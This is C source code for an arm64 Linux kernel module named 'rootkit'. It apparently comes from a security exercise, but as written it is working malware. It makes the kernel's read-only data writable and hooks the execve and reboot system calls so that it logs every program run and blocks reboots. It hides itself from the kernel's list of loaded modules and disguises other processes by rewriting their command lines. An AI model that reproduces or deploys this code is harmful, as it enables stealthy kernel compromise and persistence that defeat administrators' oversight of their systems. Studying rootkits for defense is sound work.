#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/sched/signal.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/cdev.h>
#include <linux/kprobes.h>
#include <asm/syscall.h>

#include "rootkit.h"

#define OURMODNAME	"rootkit"

MODULE_AUTHOR("FOOBAR");
MODULE_DESCRIPTION("FOOBAR");
MODULE_LICENSE("GPL");
MODULE_VERSION("0.1");

static int major;
struct cdev *kernel_cdev;

long is_hide;
char path[PATH_MAX];

struct list_head *modules_;
int (*access_remote_vm_)(struct mm_struct *mm, unsigned long addr,
			void *buf, int len, unsigned int gup_flags);
void (*update_mapping_prot_)(phys_addr_t phys, unsigned long virt,
			phys_addr_t size, pgprot_t prot);
syscall_fn_t *sys_call_table_;
long (*__arm64_sys_execve_)(const struct pt_regs *regs);
long (*__arm64_sys_reboot_)(const struct pt_regs *regs);
unsigned long __start_rodata_, __end_rodata_;

static int rootkit_open(struct inode *inode, struct file *filp)
{
	pr_info("%s\n", __func__);
	return 0;
}

static int rootkit_release(struct inode *inode, struct file *filp)
{
	pr_info("%s\n", __func__);
	return 0;
}

long hook_execve(const struct pt_regs *regs)
{
	if (copy_from_user(path, (void *)regs->regs[0], PATH_MAX))
		pr_info("copy_from_user fail.\n");
	pr_info("exec %s\n", path);
	return __arm64_sys_execve_(regs);
}

long hook_reboot(const struct pt_regs *regs)
{
	return -EFAULT;
}

// Check get_mm_cmdline
static int access_mm_name(struct mm_struct *mm, char *name, int len,
						unsigned int gup_flags)
{
	unsigned long arg_start, arg_end;

	if (!mm->env_end)
		return 0;

	spin_lock(&mm->arg_lock);
	arg_start = mm->arg_start;
	arg_end = mm->arg_end;
	spin_unlock(&mm->arg_lock);

	if (arg_start >= arg_end)
		return 0;

	return access_remote_vm_(mm, arg_start, name, len, gup_flags);
}

static void rename_process(long len, struct masq_proc *masq)
{
	long i, j;
	struct task_struct *p;
	struct mm_struct *mm;
	char task_name[MASQ_LEN];

	for (i = 0; i < len; ++i) {
		if (strlen(masq[i].new_name) > strlen(masq[i].orig_name))
			masq[i].orig_name[0] = 0;
		for (j = strlen(masq[i].new_name);
			j < strlen(masq[i].orig_name); ++j)
			masq[i].new_name[j] = 0;
	}
	for_each_process(p) {
		mm = p->mm;
		if (!mm)
			continue;
		access_mm_name(mm, task_name, MASQ_LEN, FOLL_GET);
		task_name[MASQ_LEN - 1] = 0;

		for (i = 0; i < len; ++i) {
			if (!masq[i].orig_name[0])
				continue;
			if (!strcmp(task_name, masq[i].orig_name)) {
				access_mm_name(mm, masq[i].new_name,
				strlen(masq[i].orig_name), FOLL_WRITE);
				break;
			}
		}
		// mmput(mm);
	}
}

static long rootkit_ioctl(struct file *filp, unsigned int ioctl,
		unsigned long arg)
{
	long ret = 0;
	struct masq_proc_req masq_req;
	struct masq_proc *masq;

	switch (ioctl) {
	case IOCTL_MOD_HOOK:
		sys_call_table_[__NR_execve] = hook_execve;
		sys_call_table_[__NR_reboot] = hook_reboot;
		break;
	case IOCTL_MOD_HIDE:
		if (is_hide) {
			list_add_rcu(&(THIS_MODULE->list), modules_);
			is_hide = 0;
		} else {
			list_del_rcu(&(THIS_MODULE->list));
			is_hide = 1;
		}
		break;
	case IOCTL_MOD_MASQ:
		masq_req.list = NULL;
		if (copy_from_user(&masq_req,
				 (struct masq_proc_req __user *) arg,
				 sizeof(struct masq_proc_req))) {
			pr_info("First copy_from_user fail.\n");
			ret = -EINVAL;
			break;
		}
		// pr_info("%ld %px\n", masq_req.len, masq_req.list);
		masq = kmalloc(sizeof(struct masq_proc) * masq_req.len,
			GFP_KERNEL);
		if (masq == NULL) {
			ret = -EINVAL;
			break;
		}
		if (copy_from_user(masq,
			(struct masq_proc __user *) masq_req.list,
			sizeof(struct masq_proc) * masq_req.len)) {
			pr_info("Second copy_from_user fail.\n");
			ret = -EINVAL;
			break;
		}
		rename_process(masq_req.len, masq);
		kfree(masq);
		break;
	default:
		ret = -EINVAL;
	}

	pr_info("%s\n", __func__);
	return ret;
}

const struct file_operations fops = {
open: rootkit_open,
unlocked_ioctl : rootkit_ioctl,
release : rootkit_release,
owner : THIS_MODULE
};

static void ksym_lookup(void)
{
	// Lookup necessary functions
	static struct kprobe kp = {
		.symbol_name = "kallsyms_lookup_name"};
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
	kallsyms_lookup_name_t kallsyms_lookup_name;

	register_kprobe(&kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&kp);

	modules_ = (void *)kallsyms_lookup_name("modules");
	access_remote_vm_ = (void *)kallsyms_lookup_name("access_remote_vm");
	update_mapping_prot_ =
		(void *)kallsyms_lookup_name("update_mapping_prot");
	sys_call_table_ = (void *)kallsyms_lookup_name("sys_call_table");
	__arm64_sys_execve_ =
		(void *)kallsyms_lookup_name("__arm64_sys_execve");
	__arm64_sys_reboot_ =
		(void *)kallsyms_lookup_name("__arm64_sys_reboot");
	__start_rodata_ = (unsigned long)kallsyms_lookup_name("__start_rodata");
	__end_rodata_ = (unsigned long)kallsyms_lookup_name("__end_rodata");

	pr_info("%p\n", modules_);
	pr_info("%p\n", sys_call_table_);
	pr_info("%p %p\n", sys_call_table_[__NR_execve], __arm64_sys_execve_);
	pr_info("%p %p\n", sys_call_table_[__NR_reboot], __arm64_sys_reboot_);
	pr_info("%p %p\n", (void *)__start_rodata_, (void *)__end_rodata_);
}

static int __init rootkit_init(void)
{
	int ret;
	dev_t dev_no, dev;

	kernel_cdev = cdev_alloc();
	kernel_cdev->ops = &fops;
	kernel_cdev->owner = THIS_MODULE;

	ret = alloc_chrdev_region(&dev_no, 0, 1, "rootkit");
	if (ret < 0) {
		pr_info("major number allocation failed\n");
		return ret;
	}

	major = MAJOR(dev_no);
	dev = MKDEV(major, 0);
	pr_info("The major number for your device is %d\n", major);
	ret = cdev_add(kernel_cdev, dev, 1);
	if (ret < 0) {
		pr_info("unable to allocate cdev");
		return ret;
	}

	ksym_lookup();

	update_mapping_prot_(__pa_symbol(__start_rodata_), __start_rodata_,
				__end_rodata_ - __start_rodata_, PAGE_KERNEL);

	return 0;
}

static void __exit rootkit_exit(void)
{
	sys_call_table_[__NR_execve] = __arm64_sys_execve_;
	sys_call_table_[__NR_reboot] = __arm64_sys_reboot_;
	// TODO: restore .rodata protect?

	pr_info("%s: removed\n", OURMODNAME);
	cdev_del(kernel_cdev);
	unregister_chrdev_region(major, 1);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
